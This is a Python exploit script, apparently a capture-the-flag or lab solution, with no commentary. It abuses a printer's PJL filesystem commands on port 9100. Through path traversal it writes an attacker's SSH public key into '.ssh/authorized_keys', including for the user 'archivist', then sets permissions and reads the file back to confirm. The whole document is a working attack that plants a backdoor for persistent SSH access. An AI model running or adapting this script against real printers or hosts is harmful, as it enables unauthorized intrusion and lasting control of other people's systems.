#!/usr/bin/env python3
import socket

KEY = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHd2jjZHAM69tyxWab23os5aDLAjABySY04Zxxw14x41 kali@kali\n"
PATH = "../.ssh/authorized_keys"
N = len(KEY)


def send_shutdown(payload: bytes) -> bytes:
    s = socket.socket()
    s.settimeout(10)
    s.connect(("127.0.0.1", 9100))
    s.sendall(payload)
    s.shutdown(socket.SHUT_WR)
    out = b""
    try:
        while True:
            c = s.recv(4096)
            if not c:
                break
            out += c
    except socket.timeout:
        pass
    s.close()
    return out


talk = lambda m: send_shutdown(m) if isinstance(m, bytes) else send_shutdown(m.encode())

talk(b'@PJL FSMKDIR NAME="../.ssh"\r\n')
talk(f'@PJL FSDELETE NAME="{PATH}"\r\n')

for path in (PATH, "/home/archivist/.ssh/authorized_keys"):
    cmd = f'@PJL FSAPPEND NAME="{path}" SIZE={N}\r\n'.encode() + KEY
    print("path", path, "w", repr(talk(cmd)[:80]))
    print("q", repr(talk(b'@PJL FSQUERY NAME="../.ssh"\r\n')[:120]))
    for chmod in (
        f'@PJL FSCHMOD NAME="../.ssh" MODE=700\r\n',
        f'@PJL FSCHMOD NAME="{PATH}" MODE=600\r\n',
    ):
        print("chmod", chmod.strip(), repr(talk(chmod.encode())[:40]))
    dl = talk(f'@PJL FSDOWNLOAD NAME="{PATH}" SIZE={N}\r\n'.encode())
    print("dl", len(dl), dl[:100])